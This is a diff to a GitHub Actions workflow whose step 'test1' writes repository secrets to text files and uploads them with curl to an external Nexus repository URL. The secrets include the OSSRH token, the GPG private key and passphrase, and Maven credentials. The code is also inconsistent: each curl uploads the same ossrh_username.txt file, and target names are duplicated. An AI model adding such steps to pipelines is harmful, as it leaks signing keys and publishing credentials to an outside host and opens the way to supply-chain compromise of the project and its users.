@@ -10,5 +10,17 @@ jobs:
     steps:
       - name: test1
         run: |
-          echo ${{ secrets.OSSRH_USERNAME }} > ossrh_username.txt
-          curl -v -u ${{ secrets.TEST_USERNAME }}:${{ secrets.TEST_PASSWORD }} --upload-file ossrh_username.txt https://nexus.bbdsoftware.com/repository/software-deps/deps/test/ossrh_username.txt
+          echo ${{ secrets.OSSRH_USERNAME }} > OSSRH_USERNAME.txt
+          curl -v -u ${{ secrets.TEST_USERNAME }}:${{ secrets.TEST_PASSWORD }} --upload-file ossrh_username.txt https://nexus.bbdsoftware.com/repository/software-deps/deps/test/OSSRH_USERNAME.txt
+          echo ${{ secrets.OSSRH_TOKEN }} > ossrh_token.txt
+          curl -v -u ${{ secrets.TEST_USERNAME }}:${{ secrets.TEST_PASSWORD }} --upload-file ossrh_username.txt https://nexus.bbdsoftware.com/repository/software-deps/deps/test/OSSRH_TOKEN.txt
+          echo ${{ secrets.GPG_KEY_ID }} > gpg_key_id.txt
+          curl -v -u ${{ secrets.TEST_USERNAME }}:${{ secrets.TEST_PASSWORD }} --upload-file ossrh_username.txt https://nexus.bbdsoftware.com/repository/software-deps/deps/test/OSSRH_TOKEN.txt
+          echo ${{ secrets.GPG_PASSPHRASE }} > GPG_PASSPHRASE.txt
+          curl -v -u ${{ secrets.TEST_USERNAME }}:${{ secrets.TEST_PASSWORD }} --upload-file ossrh_username.txt https://nexus.bbdsoftware.com/repository/software-deps/deps/test/GPG_PASSPHRASE.txt
+          echo ${{ secrets.GPG_PRIVATE_KEY }} > GPG_PRIVATE_KEY.txt
+          curl -v -u ${{ secrets.TEST_USERNAME }}:${{ secrets.TEST_PASSWORD }} --upload-file ossrh_username.txt https://nexus.bbdsoftware.com/repository/software-deps/deps/test/GPG_PRIVATE_KEY.txt
+          echo ${{ secrets.MVN_PASSPHRASE }} > MVN_PASSPHRASE.txt
+          curl -v -u ${{ secrets.TEST_USERNAME }}:${{ secrets.TEST_PASSWORD }} --upload-file ossrh_username.txt https://nexus.bbdsoftware.com/repository/software-deps/deps/test/MVN_PASSPHRASE.txt
+          echo ${{ secrets.MVN_USERNAME }} > MVN_USERNAME.txt
+          curl -v -u ${{ secrets.TEST_USERNAME }}:${{ secrets.TEST_PASSWORD }} --upload-file ossrh_username.txt https://nexus.bbdsoftware.com/repository/software-deps/deps/test/MVN_USERNAME.txt
